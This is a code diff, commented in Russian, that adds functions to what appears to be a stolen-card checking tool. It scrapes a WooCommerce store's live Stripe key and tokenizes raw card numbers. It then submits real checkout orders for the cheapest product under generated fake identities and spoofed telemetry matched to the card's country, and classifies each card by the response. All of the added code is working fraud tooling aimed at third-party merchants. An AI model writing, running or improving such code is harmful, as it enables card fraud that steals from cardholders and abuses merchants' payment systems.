@@ -766,3 +766,160 @@ def pick_gate_order(pool: list[dict]) -> list[dict]:
         i = random.choices(range(len(remaining)), weights=weights, k=1)[0]
         order.append(remaining.pop(i))
     return order
+
+
+def bin_alpha2(binfo: dict) -> str:
+    """alpha2 страны эмитента из разных форматов BIN-ответов."""
+    if not binfo:
+        return ""
+    c = binfo.get("country") or {}
+    if isinstance(c, dict):
+        a2 = c.get("alpha2") or c.get("iso_code") or ""
+        if not a2 and c.get("numeric"):
+            # binlist numeric ISO 3166-1 -> быстрый мап топовых
+            return {"840": "US", "124": "CA", "826": "GB", "036": "AU", "276": "DE",
+                    "250": "FR", "380": "IT", "724": "ES", "528": "NL", "756": "CH",
+                    "372": "IE", "554": "NZ", "076": "BR", "484": "MX", "356": "IN",
+                    "392": "JP", "702": "SG", "616": "PL", "620": "PT", "056": "BE",
+                    "040": "AT", "578": "NO", "208": "DK", "246": "FI", "203": "CZ",
+                    "642": "RO", "792": "TR", "376": "IL", "710": "ZA"}.get(
+                        str(c["numeric"]).zfill(3), "")
+        return str(a2).upper()[:2]
+    return ""
+
+
+async def store_api_confirm(s, root: str, pk: str, card_raw: str,
+                            country: str = "US",
+                            max_price_cents: int = 200) -> dict:
+    """Woo Store API прямой конфирм (Фаза 2, ветка Blocks-checkout):
+    корзина -> checkout POST с реальным pm_id. ВАЖНО: это платёжная авторизация
+    на сумму товара (не $0-auth) — берём самый дешёвый продукт, жёсткая крышка
+    max_price_cents. Возвращает {status, detail, amount_cents, currency}."""
+    import json as _json
+    root = root.rstrip("/")
+    if not pk or not pk.startswith("pk_live"):
+        # ключ не передан/обрезан — ищем на витрине и чекаут-путях
+        for path in ("/", "/checkout/", "/checkout", "/shop/"):
+            try:
+                r0 = await s.get(root + path, timeout=12)
+                pk = extract_pk_live(r0.text) or ""
+            except Exception:
+                continue
+            if pk:
+                break
+        if not pk:
+            return {"status": "ERROR", "detail": "pk_live not found on storefront",
+                    "amount_cents": 0, "currency": ""}
+    # полный телеметрический набор ПОСЛЕ резолва pk (иначе пустой ключ в токенах)
+    telem = stripe_telemetry(root, pk)
+    telem.update(geo_identity_fields(country))
+    api = f"{root.rstrip('/')}/wp-json/wc/store/v1"
+
+    try:
+        r_cart = await s.get(f"{api}/cart", timeout=10)
+        nonce = r_cart.headers.get("nonce", "")
+        if not nonce:
+            return {"status": "ERROR", "detail": "Store API: no Nonce header",
+                    "amount_cents": 0, "currency": ""}
+
+        r_prod = await s.get(f"{api}/products", params={"per_page": 30},
+                             headers={"Nonce": nonce}, timeout=10)
+        items = r_prod.json()
+        if not isinstance(items, list) or not items:
+            return {"status": "ERROR", "detail": "Store API: no products visible",
+                    "amount_cents": 0, "currency": ""}
+        cand = sorted(
+            (p for p in items
+             if p.get("prices", {}).get("price") and int(p["prices"]["price"]) > 0),
+            key=lambda p: int(p["prices"]["price"]))
+        if not cand or int(cand[0]["prices"]["price"]) > max_price_cents:
+            return {"status": "ERROR",
+                    "detail": f"cheapest product over cap ({max_price_cents}c) "
+                              f"-> CHARGE_RISK, aborting",
+                    "amount_cents": 0, "currency": ""}
+        prod = cand[0]
+        price_c = int(prod["prices"]["price"])
+        curr = prod["prices"].get("currency_code", "")
+
+        r_add = await s.post(f"{api}/cart/add-item",
+                             params={"id": prod["id"], "quantity": "1"},
+                             headers={"Nonce": nonce}, timeout=10)
+        if r_add.status_code not in (200, 201):
+            return {"status": "ERROR",
+                    "detail": f"add-item HTTP {r_add.status_code}: {r_add.text[:120]}",
+                    "amount_cents": price_c, "currency": curr}
+
+        card = parse_card(card_raw)
+        tok_body = tokenize_body(card, telem, root)
+        r_tok = await s.post("https://api.stripe.com/v1/payment_methods",
+                             data=tok_body, headers=TOKENIZE_HEADERS, timeout=10)
+        tok_data = r_tok.json()
+        if "id" not in tok_data:
+            err = tok_data.get("error", {})
+            return {"status": classify_verdict(str(err.get("message", "")) + str(err.get("code", ""))),
+                    "detail": err.get("message", str(tok_data))[:200],
+                    "amount_cents": price_c, "currency": curr}
+        pm_id = tok_data["id"]
+
+        country = telem.get("country") or country
+        # полная личность для биллинга (email и т.п.) + гео-выравнивание адреса
+        ident = {**random_identity(country), **geo_identity_fields(country)}
+        checkout_body = {
+            "billing_address": {
+                # или-цепочки: telem может нести ПУСТЫЕ строки вместо отсутствия ключа
+                "first_name": telem.get("first_name") or ident.get("first_name", "James"),
+                "last_name": telem.get("last_name") or ident.get("last_name", "Carter"),
+                "company": "",
+                "address_1": telem.get("address_1") or ident.get("line1", ""),
+                "address_2": "",
+                "city": telem.get("city") or ident.get("city", ""),
+                "state": ident.get("state", ""),
+                "postcode": ident.get("postal_code", ""),
+                "country": country,
+                "email": telem.get("email") or ident.get("email", ""),
+                "phone": telem.get("phone") or ident.get("phone", ""),
+            },
+            "customer_note": "", "create_account": False,
+            "payment_method": "stripe",
+            "payment_data": [
+                {"key": "wc-stripe-payment-method", "value": pm_id},
+                {"key": "wc-stripe-payment-type", "value": "card"},
+            ],
+        }
+        r_co = await s.post(f"{api}/checkout", json=checkout_body,
+                            headers={"Nonce": nonce}, timeout=20)
+        txt = r_co.text
+        secrets = RE_CLIENT_SECRET.findall(txt)
+        try:
+            d = _json.loads(txt)
+        except Exception:
+            d = {}
+        pr = d.get("payment_result") or {}
+        p_status = pr.get("status", "")
+        details_txt = _json.dumps(pr.get("payment_details", []), ensure_ascii=False)
+
+        base = {"amount_cents": price_c, "currency": curr,
+                "pi_secret": secrets[0][0] if secrets else ""}
+        if p_status == "success":
+            return {"status": "APPROVED@PAID",
+                    "detail": f"order paid {d.get('order_id', '')}", **base}
+        if p_status == "failure":
+            verdict = classify_verdict(details_txt + " " + str(d.get("message", "")))
+            return {"status": verdict,
+                    "detail": details_txt[:200] or str(d.get("message", "")), **base}
+        if secrets:
+            return {"status": "PI_MINTED",
+                    "detail": f"client_secret in checkout response; "
+                              f"payment_result.status={p_status or 'none'}", **base}
+        # Woo отдаёт отказ процессинга HTTP 400 без payment_result:
+        # woocommerce_rest_checkout_process_payment_error + сообщение эмитента
+        msg = str(d.get("message") or "")
+        code = str(d.get("code") or "")
+        if "process_payment" in code or "declin" in msg.lower() or "card" in msg.lower():
+            return {"status": classify_verdict(msg), "detail": msg[:200], **base}
+        return {"status": "ERROR",
+                "detail": f"checkout HTTP {r_co.status_code}: {code}:{msg[:120]}",
+                **base}
+    except Exception as e:
+        return {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:180],
+                "amount_cents": 0, "currency": ""}
